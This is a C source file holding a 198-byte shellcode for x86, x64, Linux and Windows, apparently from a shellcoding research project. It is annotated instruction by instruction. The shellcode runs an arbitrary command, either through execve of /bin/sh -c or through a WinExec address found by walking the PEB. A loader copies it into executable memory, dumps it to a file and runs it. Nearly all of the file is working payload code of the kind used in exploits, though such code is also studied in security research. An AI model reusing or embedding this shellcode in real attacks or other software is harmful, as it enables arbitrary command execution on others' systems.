/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#if defined (_WIN32) || defined(_WIN64)
#define WIN
#include <windows.h>
#else
#include <sys/mman.h>
#endif

#define CMD_LEN_OFS 0x10+1
#define EXEC_SIZE 198

char exec[]= {
  /* 0000 */ "\x56"                         /* push esi                        */
  /* 0001 */ "\x57"                         /* push edi                        */
  /* 0002 */ "\x53"                         /* push ebx                        */
  /* 0003 */ "\x55"                         /* push ebp                        */
  /* 0004 */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 0006 */ "\xf7\xe1"                     /* mul ecx                         */
  /* 0008 */ "\x50"                         /* push eax                        */
  /* 0009 */ "\x50"                         /* push eax                        */
  /* 000A */ "\x50"                         /* push eax                        */
  /* 000B */ "\x50"                         /* push eax                        */
  /* 000C */ "\x50"                         /* push eax                        */
  /* 000D */ "\xeb\x3b"                     /* jmp 0x4a                        */
  /* 000F */ "\x5f"                         /* pop edi                         */
  /* 0010 */ "\xb1\x07"                     /* mov cl, 0x7                     */
  /* 0012 */ "\x50"                         /* push eax                        */
  /* 0013 */ "\x57"                         /* push edi                        */
  /* 0014 */ "\xf2\xae"                     /* repne scasb                     */
  /* 0016 */ "\xaa"                         /* stosb                           */
  /* 0017 */ "\x57"                         /* push edi                        */
  /* 0018 */ "\x66\xaf"                     /* scasw                           */
  /* 001A */ "\xaa"                         /* stosb                           */
  /* 001B */ "\x57"                         /* push edi                        */
  /* 001C */ "\x54"                         /* push esp                        */
  /* 001D */ "\x57"                         /* push edi                        */
  /* 001E */ "\xb0\x06"                     /* mov al, 0x6                     */
  /* 0020 */ "\x41"                         /* inc ecx                         */
  /* 0021 */ "\xe3\x12"                     /* jecxz 0x35                      */
  /* 0023 */ "\x66\x8c\xe9"                 /* mov cx, gs                      */
  /* 0026 */ "\xe3\x24"                     /* jecxz 0x4c                      */
  /* 0028 */ "\x54"                         /* push esp                        */
  /* 0029 */ "\x58"                         /* pop eax                         */
  /* 002A */ "\xc1\xe8\x18"                 /* shr eax, 0x18                   */
  /* 002D */ "\x74\x1d"                     /* jz 0x4c                         */
  /* 002F */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 0031 */ "\x5b"                         /* pop ebx                         */
  /* 0032 */ "\x59"                         /* pop ecx                         */
  /* 0033 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0035 */ "\x6a\xff"                     /* push 0xffffffff                 */
  /* 0037 */ "\x5f"                         /* pop edi                         */
  /* 0038 */ "\x0f\x05"                     /* syscall                         */
  /* 003A */ "\x3c\x05"                     /* cmp al, 0x5                     */
  /* 003C */ "\x74\x0e"                     /* jz 0x4c                         */
  /* 003E */ "\x3c\x08"                     /* cmp al, 0x8                     */
  /* 0040 */ "\x74\x0a"                     /* jz 0x4c                         */
  /* 0042 */ "\x6a\x3b"                     /* push 0x3b                       */
  /* 0044 */ "\x58"                         /* pop eax                         */
  /* 0045 */ "\x99"                         /* cdq                             */
  /* 0046 */ "\x5f"                         /* pop edi                         */
  /* 0047 */ "\x5e"                         /* pop esi                         */
  /* 0048 */ "\x0f\x05"                     /* syscall                         */
  /* 004A */ "\xeb\x75"                     /* jmp 0xc1                        */
  /* 004C */ "\x58"                         /* pop eax                         */
  /* 004D */ "\x58"                         /* pop eax                         */
  /* 004E */ "\x58"                         /* pop eax                         */
  /* 004F */ "\x58"                         /* pop eax                         */
  /* 0050 */ "\x59"                         /* pop ecx                         */
  /* 0051 */ "\x58"                         /* pop eax                         */
  /* 0052 */ "\x40"                         /* inc eax                         */
  /* 0053 */ "\x92"                         /* xchg edx, eax                   */
  /* 0054 */ "\x74\x16"                     /* jz 0x6c                         */
  /* 0056 */ "\x50"                         /* push eax                        */
  /* 0057 */ "\x51"                         /* push ecx                        */
  /* 0058 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:edx+0x2f]          */
  /* 005C */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
  /* 005F */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
  /* 0062 */ "\xad"                         /* lodsd                           */
  /* 0063 */ "\x8b\x30"                     /* mov esi, [eax]                  */
  /* 0065 */ "\x8b\x7e\x18"                 /* mov edi, [esi+0x18]             */
  /* 0068 */ "\xb2\x50"                     /* mov dl, 0x50                    */
  /* 006A */ "\xeb\x17"                     /* jmp 0x83                        */
  /* 006C */ "\xb2\x60"                     /* mov dl, 0x60                    */
  /* 006E */ "\x65\x48"                     /* dec eax                         */
  /* 0070 */ "\x8b\x32"                     /* mov esi, [edx]                  */
  /* 0072 */ "\x48"                         /* dec eax                         */
  /* 0073 */ "\x8b\x76\x18"                 /* mov esi, [esi+0x18]             */
  /* 0076 */ "\x48"                         /* dec eax                         */
  /* 0077 */ "\x8b\x76\x10"                 /* mov esi, [esi+0x10]             */
  /* 007A */ "\x48"                         /* dec eax                         */
  /* 007B */ "\xad"                         /* lodsd                           */
  /* 007C */ "\x48"                         /* dec eax                         */
  /* 007D */ "\x8b\x30"                     /* mov esi, [eax]                  */
  /* 007F */ "\x48"                         /* dec eax                         */
  /* 0080 */ "\x8b\x7e\x30"                 /* mov edi, [esi+0x30]             */
  /* 0083 */ "\x03\x57\x3c"                 /* add edx, [edi+0x3c]             */
  /* 0086 */ "\x8b\x5c\x17\x28"             /* mov ebx, [edi+edx+0x28]         */
  /* 008A */ "\x8b\x74\x1f\x20"             /* mov esi, [edi+ebx+0x20]         */
  /* 008E */ "\x48"                         /* dec eax                         */
  /* 008F */ "\x01\xfe"                     /* add esi, edi                    */
  /* 0091 */ "\x8b\x54\x1f\x24"             /* mov edx, [edi+ebx+0x24]         */
  /* 0095 */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [edi+edx]       */
  /* 0099 */ "\x48"                         /* dec eax                         */
  /* 009A */ "\x8d\x52\x02"                 /* lea edx, [edx+0x2]              */
  /* 009D */ "\xad"                         /* lodsd                           */
  /* 009E */ "\x81\x3c\x07\x57\x69\x6e\x45" /* cmp dword [edi+eax], 0x456e6957 */
  /* 00A5 */ "\x75\xee"                     /* jnz 0x95                        */
  /* 00A7 */ "\x8b\x74\x1f\x1c"             /* mov esi, [edi+ebx+0x1c]         */
  /* 00AB */ "\x48"                         /* dec eax                         */
  /* 00AC */ "\x01\xfe"                     /* add esi, edi                    */
  /* 00AE */ "\x8b\x34\xae"                 /* mov esi, [esi+ebp*4]            */
  /* 00B1 */ "\x48"                         /* dec eax                         */
  /* 00B2 */ "\x01\xf7"                     /* add edi, esi                    */
  /* 00B4 */ "\x99"                         /* cdq                             */
  /* 00B5 */ "\xff\xd7"                     /* call edi                        */
  /* 00B7 */ "\x58"                         /* pop eax                         */
  /* 00B8 */ "\x58"                         /* pop eax                         */
  /* 00B9 */ "\x58"                         /* pop eax                         */
  /* 00BA */ "\x58"                         /* pop eax                         */
  /* 00BB */ "\x58"                         /* pop eax                         */
  /* 00BC */ "\x5d"                         /* pop ebp                         */
  /* 00BD */ "\x5b"                         /* pop ebx                         */
  /* 00BE */ "\x5f"                         /* pop edi                         */
  /* 00BF */ "\x5e"                         /* pop esi                         */
  /* 00C0 */ "\xc3"                         /* ret                             */
  /* 00C1 */ "\xe8\x49\xff\xff\xff"         /* call 0xf                        */
};

// save code to binary file
void bin2file (uint8_t bin[], size_t len)
{
  FILE *out=fopen ("sh_cmd.bin", "wb");
  if (out!=NULL)
  {
    fwrite (bin, 1, len, out);
    fclose (out);
  }
}
// allocate read/write and executable memory
// copy data from code and execute
void xcode(void *code, size_t code_len, char *cmd, size_t cmd_len)
{
  void *bin;
  uint8_t *p;
  char args[]="\xFF-c\xFF/bin//sh\x00";
  size_t arg_len;
  
  arg_len=strlen(args) + 1;
  
  printf ("[ executing code...\n");
    
#ifdef WIN
  bin=VirtualAlloc (0, code_len + cmd_len + arg_len, 
    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
#else
  bin=mmap (0, code_len + cmd_len + arg_len, 
    PROT_EXEC | PROT_WRITE | PROT_READ, 
    MAP_ANON  | MAP_PRIVATE, -1, 0);
#endif
  if (bin!=NULL)
  {
    p=(uint8_t*)bin;
    
    memcpy (p, code, code_len);
    // set the cmd length
    p[CMD_LEN_OFS] = (uint8_t)cmd_len;
    // copy cmd
    memcpy ((void*)&p[code_len], cmd, cmd_len);
    // copy argv
    memcpy ((void*)&p[code_len+cmd_len], args, arg_len);
    
    //DebugBreak();
    bin2file(bin, code_len+cmd_len+arg_len);
    
    // execute
    ((void(*)())bin)();
    
#ifdef WIN
    VirtualFree (bin, code_len+cmd_len+arg_len, MEM_RELEASE);
#else
    munmap (bin, code_len+cmd_len+arg_len);
#endif
  }
}

int main(int argc, char *argv[])
{
    size_t len;
    char   *cmd;
    
    if (argc != 2) {
      printf ("\n  usage: xcmd <command>\n");
      return 0;
    }
    
    cmd=argv[1];
    len=strlen(cmd);
    
    if (len==0 || len>255) {
      printf ("\n  invalid command length: %i (must be between 1 and 255)", len);
      return 0;
    }
    
    xcode(exec, EXEC_SIZE, cmd, len);
    
    return 0;
}
